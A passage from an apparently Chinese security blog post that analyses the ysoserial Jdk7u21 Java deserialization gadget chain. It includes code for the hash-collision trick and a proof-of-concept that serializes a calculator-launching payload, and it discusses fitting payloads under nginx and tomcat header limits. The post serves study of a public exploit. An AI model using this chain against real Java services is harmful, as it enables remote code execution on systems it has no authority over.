</pre></div>
<p>我们可以知道它的序列化规则</p>
<div class="highlight"><pre><span></span><span class="n">s</span><span class="o">.</span><span class="na">defaultWriteObject</span><span class="o">();</span>
<span class="n">s</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">capacity</span><span class="o">());</span>
<span class="n">s</span><span class="o">.</span><span class="na">writeFloat</span><span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">loadFactor</span><span class="o">());</span>
<span class="n">s</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">size</span><span class="o">());</span>
<span class="k">for</span> <span class="o">(</span><span class="n">E</span> <span class="n">e</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span>
<span class="n">s</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</pre></div>
<p>可以看到有个获取map大小，然后循环写入的过程。(也就是循环写入每一个元素)</p>
<p>在我们的exp里面分别按顺序执行<code>set.add(templates);</code> 、<code>set.add(proxy);</code> 添加了两个元素。</p>
<p>这到底是为什么需要两个呢？</p>
<p>还有就是</p>
<div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">zeroHashCodeStr</span> <span class="o">=</span> <span class="s">"f5a5a608"</span><span class="o">;</span>
<span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
<span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="s">"foo"</span><span class="o">);</span>
<span class="o">.......</span>
<span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
<span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span> <span class="c1">// swap in real object</span>
</pre></div>
<p>我们对创建的代理对象设置了一个特殊的<code>HashMap map</code>,</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164412-aebb6dae-ccc0-1.png"/></p>
<p>作为了<code>memberValues</code>属性的值。  让我们带着这两个问题去分析一下。</p>
<p><strong>从readObject开始分析</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164423-b55dcbe8-ccc0-1.png"/></p>
<p>这里先取出了我们先传入第一个<code>templates</code>, 其中<code>PRESENT</code> 是一个空的Object   跟进看下 <code>map.put</code> 方法的处理</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">V</span> <span class="nf">put</span><span class="o">(</span><span class="n">K</span> <span class="n">key</span><span class="o">,</span> <span class="n">V</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">putForNullKey</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">indexFor</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="n">table</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
        <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">table</span><span class="o">[</span><span class="n">i</span><span class="o">];</span> <span class="n">e</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">next</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Object</span> <span class="n">k</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">hash</span> <span class="o">==</span> <span class="n">hash</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="n">k</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">key</span><span class="o">)</span> <span class="o">==</span> <span class="n">key</span> <span class="o">||</span> <span class="n">key</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">k</span><span class="o">)))</span> <span class="o">{</span>
                <span class="n">V</span> <span class="n">oldValue</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">value</span><span class="o">;</span>
                <span class="n">e</span><span class="o">.</span><span class="na">value</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
                <span class="n">e</span><span class="o">.</span><span class="na">recordAccess</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
                <span class="k">return</span> <span class="n">oldValue</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="n">modCount</span><span class="o">++;</span>
        <span class="n">addEntry</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164446-c2b1dc08-ccc0-1.png"/></p>
<p>因为table一开始为空的，所以我们第一次进入不了循环,最后进入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164456-c8da75d6-ccc0-1.png"/></p>
<p>传入了我们第一个实例通过<code>hash()</code>计算出的hash、实例和空object和 <code>indexFor()</code>计算出的i值</p>
<p>通过<code>addEntry</code>方法添加到了<code>table</code>这个Entry中,继续往下执行,</p>
<p>跳转回<code>map.put(e, PRESENT);</code>传入我们第二个代理实例。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164507-cf98a730-ccc0-1.png"/></p>
<p>先记住当前传入的这些值，后面就会发现这些值会有神奇的作用。</p>
<p>我们继续重复上次的操作，先计算<code>hash</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164523-d8f128fc-ccc0-1.png"/></p>
<p>因为是代理对象,执行方法的时候会进入<code>invoke</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164531-ddbc4b6e-ccc0-1.png"/></p>
<p>我们跟进<code>hashCodeImpl</code></p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">int</span> <span class="nf">hashCodeImpl</span><span class="o">()</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">var1</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>

        <span class="n">Entry</span> <span class="n">var3</span><span class="o">;</span>
        <span class="k">for</span><span class="o">(</span><span class="n">Iterator</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span> <span class="n">var2</span><span class="o">.</span><span class="na">hasNext</span><span class="o">();</span> <span class="n">var1</span> <span class="o">+=</span> <span class="mi">127</span> <span class="o">*</span> <span class="o">((</span><span class="n">String</span><span class="o">)</span><span class="n">var3</span><span class="o">.</span><span class="na">getKey</span><span class="o">()).</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">^</span> <span class="n">memberValueHashCode</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">getValue</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">var3</span> <span class="o">=</span> <span class="o">(</span><span class="n">Entry</span><span class="o">)</span><span class="n">var2</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">var1</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164541-e3d501a8-ccc0-1.png"/></p>
<p>var2遍历我们传入的map对象,其中var3就是我们的map对象。</p>
<p><code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue()</code></p>
<p>其中</p>
<p><code>var3.getKey()).hashCode()</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164554-ebb25db2-ccc0-1.png"/></p>
<p>这个值<code>f5a5a608</code>计算结果为0.</p>
<p><code>memberValueHashCode(var3.getValue()</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164603-f0d317dc-ccc0-1.png"/></p>
<p>这个值直接返回<code>map.put(zeroHashCodeStr, templates);</code> 中的<code>templates</code>的<code>hashcode</code>结果。</p>
<p>所以</p>
<div class="highlight"><pre><span></span><span class="n">var1</span> <span class="o">+=</span> <span class="mi">127</span> <span class="o">*</span> <span class="o">((</span><span class="n">String</span><span class="o">)</span><span class="n">var3</span><span class="o">.</span><span class="na">getKey</span><span class="o">()).</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">^</span> <span class="n">memberValueHashCode</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">getValue</span><span class="o">())</span>
</pre></div>
<p>其实就是:</p>
<pre><code>var1 += 0^memberValueHashCode(var3.getValue())</code></pre>
<p><code>0^x =x</code>,所以结果就是<code>templates</code>的<code>hashcode</code>的结果。</p>
<p>这个结果恰好是我们第一次传入的对象结果。</p>
<div class="highlight"><pre><span></span><span class="n">LinkedHashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashSet</span><span class="o">();</span> <span class="c1">// maintain order</span>
        <span class="c1">// 第一次传入的是templates实例</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
        <span class="c1">// 第二次传入的是proxy代理实例</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>
</pre></div>
<p><strong>虽然我们传入的两个不一样的东西，但是计算hashcode的时候，代理实例的值使我们可以通过设置<code>this.memberValue</code>来控制的。</strong></p>
<p>后面继续向下走:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164612-f67b78fa-ccc0-1.png"/></p>
<p><code>e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))</code></p>
<p>首先<code>e.hash == hash</code>这个是满足的,根据&amp;&amp; 短路原则，会继续计算右边的结果,<code>(k = e.key) == key</code></p>
<p>这里进行了赋值<code>K = e.key</code>所以k就是<code>templates</code>,显然不会等于代理类对象key。根据 ||的短路原则</p>
<p>最终进入了<code>key.equals(k)</code>,也就是前面我们所说的<code>proxy.equals(calc)</code>，成功完成整个反序列化的RCE链。</p>
<h2 data-content="1" id="315fe29da11175adeebc84e924a6fc0c">0x5 POC 长度</h2>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">ysoserial.example</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">ysoserial.payloads.Jdk7u21</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">PayloadOk</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Object</span> <span class="n">calc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Jdk7u21</span><span class="o">().</span><span class="na">getObject</span><span class="o">(</span><span class="s">"open /System/Applications/Calculator.app"</span><span class="o">);</span>

            <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span><span class="c1">//用于存放person对象序列化byte数组的输出流</span>

            <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"/tmp/payload.ser"</span><span class="o">)));</span>
            <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">calc</span><span class="o">);</span><span class="c1">//序列化对象</span>
            <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
            <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164621-fb76777e-ccc0-1.png"/></p>
<p>可以看到这个POC的Base64之后大小只有3489个字节。常见的nginx header头部max length 4096和tomcat的8192</p>
<p>都可以兼容这个POC。</p>
<p>我们可以继续浏览下其他的反序列化链的大小。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164629-00166e42-ccc1-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164636-04b7c932-ccc1-1.png"/></p>
<p>可以看到不同的POC,字节大小的区别还是挺大的,针对不同的容器,选择不同的POC，以及对POC的优化还是很有必要的。</p>
<h2 data-content="1" id="02e47c8f97aacd4235650aec261dd838">0x6 总结</h2>
<p>  这个链条第一次看的时候感觉真的挺复杂的，但是通过分析之后，理解起来还是比较简单的。但是能够发现这个反序列化链绝对是神级大佬级别的(好奇ing,这种链条的发现真的骚)。后面分析下如何在Shiro 550 tomcat环境中利用该链条执行命令回显。</p>
<h2 data-content="1" id="d145db48d03379640e4efd102671c429">0x7 参考链接</h2>
<p><a href="https://zhuanlan.zhihu.com/p/83429963" target="_blank">Java 领域概念：JDK、JRE、JVM</a></p>
<p><a href="https://y4er.com/post/ysoserial-jdk7u21/" target="_blank">Ysoserial JDK7u21</a></p>
<p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank">Security Advisory – Java SE</a></p>
<p><a href="[https://lalajun.github.io/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/](https://lalajun.github.io/2019/11/30/JDK反序列化Gadgets 7u21/" target="_blank">JDK反序列化Gadget 7u21</a>)</p>
<p><a href="https://mp.weixin.qq.com/s/O1ay4BHiyPBkotNIgDQ6Kg" target="_blank">Java反序列化系列 ysoserial Hibernate1</a></p>
<p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank">Java反序列 Jdk7u21 Payload 学习笔记</a></p>
<p><a href="https://www.cnblogs.com/tech-bird/p/3525336.html" target="_blank">java中的反射</a></p>
<p><a href="https://www.cnblogs.com/xiaoluo501395377/p/3383130.html" target="_blank">java的动态代理机制详解</a></p>
</div>
</div>